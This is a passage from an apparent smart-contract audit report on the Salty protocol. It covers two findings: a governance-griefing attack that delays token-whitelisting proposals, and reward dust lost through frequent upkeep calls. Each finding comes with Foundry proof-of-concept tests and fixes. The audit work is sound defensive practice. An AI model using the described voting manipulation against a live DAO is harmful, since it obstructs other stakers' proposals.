- Additionally, it is worth considering the idea that in a scenario where a proposal has once been declared eligible to be passed (like proposalB in our case), but got reverted due to extraneous circumstances (like low saltBalance) then it be marked as valid for future retries without going through the same checks again.

---

### <a id="m-17"></a>[M-17]
## **Ballots not yet past their deadline are incorrectly looped too by tokenWhitelistingBallotWithTheMostVotes()**
#### https://github.com/code-423n4/2024-01-salty/blob/main/src/dao/Proposals.sol#L417
<br>

## Impact
Inside `DAO.sol`, [_finalizeTokenWhitelisting()](https://github.com/code-423n4/2024-01-salty/blob/main/src/dao/DAO.sol#L250) before finalizing a token whitelisting proposal makes a check that it's the ballot with most votes:
```js
249			// Fail to whitelist for now if this isn't the whitelisting proposal with the most votes - can try again later.
250			uint256 bestWhitelistingBallotID = proposals.tokenWhitelistingBallotWithTheMostVotes();
251			require( bestWhitelistingBallotID == ballotID, "Only the token whitelisting ballot with the most votes can be finalized" );
```

The [tokenWhitelistingBallotWithTheMostVotes()](https://github.com/code-423n4/2024-01-salty/blob/main/src/dao/Proposals.sol#L417) function however does not care if the other ballots being looped through are yet not past their deadline. This is an incorrect approach because a ballot which has more `Yes` votes at this point of time may well turn into a rejected ballot by its deadline timestamp if additional `No` votes are cast in coming days. Hence using its current state to deny whitelisting of a proposal past its deadline is unfair & only contributes to delaying the timelines, since this may happen again & again which would result in the protocol repeatedly pushing the finalization time further & further away into the future.<br>
- Either only ballots past their deadline should be considered, OR
- Only compare ballots which were created within a few hours of each other
<br>

Explanation through an example scenario _(also provided in the form of a coded PoC in the next section)_:
- Dan, Alice and Bob stake some salt. Dan = `2,400,000`, Alice = `290,000` and Bob = `310,000`
- Hence, total staked salt = `6,000,000`
- Alice floats ProposalA for token whitelisting with deadline timestamp `t_a`
- Minimum quorum required is 20% of 6,000,000 = `600,000`
- ProposalA receives votes : `YES = 310,000; NO = 290,000`. Quorum reached.
- Just a day before `t_a`, Bob floats ProposalB for whitelisting with deadline timestamp `t_b`
- ProposalB receives votes : `YES = 600,000; NO = 0`. Quorum reached. Also, ProposalB has more `Yes` votes than ProposalA.
- At timestamp `t_a`, `finalizeBallot()` is called for ProposalA but it faces a `revert` on [L251](https://github.com/code-423n4/2024-01-salty/blob/main/src/dao/DAO.sol#L251) because ProposalB has greater `Yes` votes
- An hour before `t_b`, Dan casts his `No` vote for ProposalB which results in : `YES = 600,000; NO = 2,400,000` making it lose with overwhelming majority.
- Note that instead of the above step, another possibility is that some of the current 'Yes` voters change their vote to `No`.
- `finalizeBallot()` can be called again for ProposalA and it would pass now **_given that no other proposal has been floated meanwhile which has accumulated more votes_**, else we could keep going through the above cycle once again.

**This caused a delay of around 11 days in ProposalA's finalization.** This works as a good attack vector for a malicious staker who wishes to postpone someone's else proposal but does not have enough voting power to defeat it. With some positive votes coming their way from unsuspecting stakers, they can mount this attack. Here's how:
- Alice and Bob stake some salt. Alice = `290,000` and Bob = `310,000`. Bob is the malicious actor here.
- Remaining salt is staked by other normal users amounting to `2,400,000`
- Hence, total staked salt = `6,000,000`
- Alice floats ProposalA for token whitelisting with deadline timestamp `t_a`
- Minimum quorum required is 20% of 6,000,000 = `600,000`
- ProposalA receives votes : `YES = 315,000; NO = 310,000`. Quorum reached. Bob had voted `No`, but he could not overcome the `Yes` votes, getting beat by a small margin.
- Bob attempts his attack. A few days before `t_a`, Bob floats ProposalB for whitelisting with deadline timestamp `t_b` and votes `Yes` himself.
- Some unsuspecting users don't have anything against his proposal and choose to vote `Yes`. At timestamp `t_a` his vote tally turns out to be `YES = 320,000; NO = 319,990`. In spite of being very close to losing the ballot, he still has more `Yes` votes than ProposalA.
- At timestamp `t_a` when `finalizeBallot()` is called for ProposalA, it faces a `revert` due to having lesser votes. Bob successfully delayed ProposalA's finalization.
- Bob was never really interested in whitelisting any token, so upon reaching close to his deadline `t_b`, he can choose to change his votes to `No` and let the proposal fail. 

## Proof of Concept
Add the following tests inside `src/dao/tests/DAO.t.sol` and run via `COVERAGE="yes" NETWORK="sep" forge test -vv --rpc-url https://rpc.ankr.com/eth_sepolia --mt test_tokenWhitelistingDelayed` to see the test pass:
```js
	function test_tokenWhitelistingDelayed() public
		{
		// *************** Setup steps ***************
        deal(address(salt), address(DEPLOYER), 2_400_000 ether);
		uint256 aliceStakedAmount = 290_000 ether;
		uint256 bobStakedAmount = 310_000 ether;
        deal(address(salt), address(alice), aliceStakedAmount);
        deal(address(salt), address(bob), bobStakedAmount);
        deal(address(salt), address(dao), 5000000 ether);

		vm.prank(DEPLOYER);
        staking.stakeSALT(2_400_000 ether);
		vm.startPrank(bob);
		salt.approve(address(staking), bobStakedAmount);
        staking.stakeSALT(bobStakedAmount);
		vm.stopPrank();
		// *********************************************

        // Alice stakes her SALT to get voting power
        vm.startPrank(alice);
        staking.stakeSALT(aliceStakedAmount);

		// Propose a whitelisting ballot and cast vote
		// Quorum required = 20% of (2_400_000 + 290_000 + 310_000) = 600_000 
		uint256 ballotID = 1;
		IERC20 test = new TestERC20( "TEST", 18 );
		proposals.proposeTokenWhitelisting(test, "url", "description");
		proposals.castVote(ballotID, Vote.NO);
		vm.stopPrank();
		vm.prank(bob);
		proposals.castVote(ballotID, Vote.YES); // @audit-info : ballot_1 quorum reached

		// Increase block time to 1 hour before finalizing the ballot
		skip(daoConfig.ballotMinimumDuration() - 1 hours);

		// Bob proposes a whitelisting ballot and casts vote
		vm.startPrank(bob);
		IERC20 test2 = new TestERC20( "TEST2", 18 );
		proposals.proposeTokenWhitelisting(test2, "url2", "description2");
		proposals.castVote(ballotID + 1, Vote.YES);
		vm.stopPrank();
		vm.prank(alice);
		proposals.castVote(ballotID + 1, Vote.YES); // @audit-info : ballot_2 quorum reached; All YES votes; deadline still in the future

		// Increase block time to that of finalizing ballot_1
		skip(1 hours);

		// @audit : this would revert since Bob's ballot has more YES votes than Alice's
		vm.expectRevert("Only the token whitelisting ballot with the most votes can be finalized");
        dao.finalizeBallot(ballotID);

		skip(daoConfig.ballotMinimumDuration() - 2 hours);
		// more votes are cast for ballot_2
		vm.prank(DEPLOYER);
		proposals.castVote(ballotID + 1, Vote.NO); // @audit-info : ballot_2 now has NO > YES votes

		// @audit : this would pass now
        dao.finalizeBallot(ballotID);
		// Check that the ballot is finalized
        bool isBallotFinalized = !proposals.ballotForID(ballotID).ballotIsLive;
        assertTrue(isBallotFinalized);
    }
```

## Tools used
Foundry

## Recommended Mitigation Steps
- Either only ballots past their deadline should be considered, OR
- Only compare ballots which were created within a few hours of each other.

The following diff uses the first option:
```diff
	// Returns the ballotID of the whitelisting ballot that currently has the most yes votes
	// Requires that the quorum has been reached and that the number of yes votes is greater than the number no votes
	function tokenWhitelistingBallotWithTheMostVotes() external view returns (uint256)
		{
		uint256 quorum = requiredQuorumForBallotType( BallotType.WHITELIST_TOKEN);

		uint256 bestID = 0;
		uint256 mostYes = 0;
		for( uint256 i = 0; i < _openBallotsForTokenWhitelisting.length(); i++ )
			{
			uint256 ballotID = _openBallotsForTokenWhitelisting.at(i);
+			if (block.timestamp < ballots[ballotID].ballotMinimumEndTime)
+			    continue;
			uint256 yesTotal = _votesCastForBallot[ballotID][Vote.YES];
			uint256 noTotal = _votesCastForBallot[ballotID][Vote.NO];

			if ( (yesTotal + noTotal) >= quorum ) // Make sure that quorum has been reached
			if ( yesTotal > noTotal )  // Make sure the token vote is favorable
			if ( yesTotal > mostYes )  // Make sure these are the most yes votes seen
				{
				bestID = ballotID;
				mostYes = yesTotal;
				}
			}

		return bestID;
		}
```

---

### <a id="m-18"></a>[M-18]
## **Pools' small profits are wiped out by performUpkeep() in step7**
#### https://github.com/code-423n4/2024-01-salty/blob/main/src/Upkeep.sol#L200
<br>

## Impact
Inside `Upkeep.sol`, [step7()](https://github.com/code-423n4/2024-01-salty/blob/main/src/Upkeep.sol#L200) clears the profit for pools after it has attempted to distribute the rewards:
```js
	// 7. Distribute SALT from SaltRewards to the stakingRewardsEmitter and liquidityRewardsEmitter.
	function step7() public onlySameContract
		{
		uint256[] memory profitsForPools = pools.profitsForWhitelistedPools();

		bytes32[] memory poolIDs = poolsConfig.whitelistedPools();
		saltRewards.performUpkeep(poolIDs, profitsForPools );
@---->	pools.clearProfitsForPools();
		}
```

Since `performUpkeep()` can be called by anyone with any frequency (even bots with a high frequency), it becomes possible to call it when reward value is too small. This causes rounding-down to zero and the reward amount does not get a chance to accumulate to a higher value when distributing it would make more sense. Consider this scenario:
- `saltRewards` contract has a salt balance of `4` which would be paid out as rewards
- During upkeep (specifically step7), 10% is sent to the SALT/USDS liquidityRewardsEmitter. This equals `10% of 4 = 0`
- 50% of the remaining is sent to `stakingRewardsEmitter` which amounts to : `50% of (4 - 0) = 2`
- Whatever remains is distributed equally amongs the SALT/WETH, WBTC/WETH and the SALT/WBTC pools : `2 / 3 = 0` i.e. they receive `0` rewards.
- As a result, the dust `2` is never allowed a chance to accumulate and reach a higher value such that it can be distributed properly the next time performUpkeep is called.

Pools keep on losing rewards due to high frequency of upkeep calls.

## Proof of Concept
Add the following tests inside `src/root_tests/Upkeep.t.sol` and run via `COVERAGE="yes" NETWORK="sep" forge test -vv --rpc-url https://rpc.ankr.com/eth_sepolia --mt test_smallProfitsWipedOutInStep7` to see the test pass. Please refer comments inside which highlight the `0` reward received by pools:
```js
    function test_smallProfitsWipedOutInStep7() public
    	{
    	// Generate arbitrage profits for the SALT/WETH, SALT/WBTC and WBTC/WETH pools
		_generateArbitrageProfits(true);

    	// Send some SALT to SaltRewards
    	vm.prank(address(daoVestingWallet));
    	salt.transfer(address(saltRewards), 4);  // @audit : a small reward amount

		// stakingRewardsEmitter and liquidityRewardsEmitter have initial bootstrapping rewards
		bytes32[] memory poolIDsB = new bytes32[](1);
		poolIDsB[0] = PoolUtils._poolID(salt, usds);
		uint256 initialRewardsB = liquidityRewardsEmitter.pendingRewardsForPools(poolIDsB)[0];

		bytes32[] memory poolIDsA = new bytes32[](1);
		poolIDsA[0] = PoolUtils.STAKED_SALT;
		uint256 initialRewardsA = stakingRewardsEmitter.pendingRewardsForPools(poolIDsA)[0];

        vm.prank(address(upkeep));
    	ITestUpkeep(address(upkeep)).step7();

		// Check that 10% of the rewards were sent directly to the SALT/USDS liquidityRewardsEmitter
		assertEq( liquidityRewardsEmitter.pendingRewardsForPools(poolIDsB)[0] - initialRewardsB, 0 ether ); // @audit : 0 reward

		// Check that 50% of the remaining 90% were sent to the stakingRewardsEmitter
		assertEq( stakingRewardsEmitter.pendingRewardsForPools(poolIDsA)[0] - initialRewardsA, 2 );

		bytes32[] memory poolIDs = new bytes32[](4);
		poolIDs[0] = PoolUtils._poolID(salt,weth);
		poolIDs[1] = PoolUtils._poolID(salt,wbtc);
		poolIDs[2] = PoolUtils._poolID(wbtc,weth);
		poolIDs[3] = PoolUtils._poolID(salt,usds);

		// Check that rewards were sent proportionally to the three pools involved in generating the test arbitrage
		assertEq( liquidityRewardsEmitter.pendingRewardsForPools(poolIDs)[0] - initialRewardsB, 0 ether );  // @audit : 0 reward
		assertEq( liquidityRewardsEmitter.pendingRewardsForPools(poolIDs)[1] - initialRewardsB, 0 ether );  // @audit : 0 reward
		assertEq( liquidityRewardsEmitter.pendingRewardsForPools(poolIDs)[2] - initialRewardsB, 0 ether );  // @audit : 0 reward

		// Check that the rewards were reset
		vm.prank(address(upkeep));
		uint256[] memory profitsForPools = IPoolStats(address(pools)).profitsForWhitelistedPools();
		for( uint256 i = 0; i < profitsForPools.length; i++ )
			assertEq( profitsForPools[i], 0 ether);
	  	}
```

## Tools used
Foundry

## Recommended Mitigation Steps
The protocol should check that in case the rewards are below a certain threshold, they should not be sent & not be reset for now. Also, any dust remaining behind after distributing it to the pools should be allowed to accumulate for future.

---

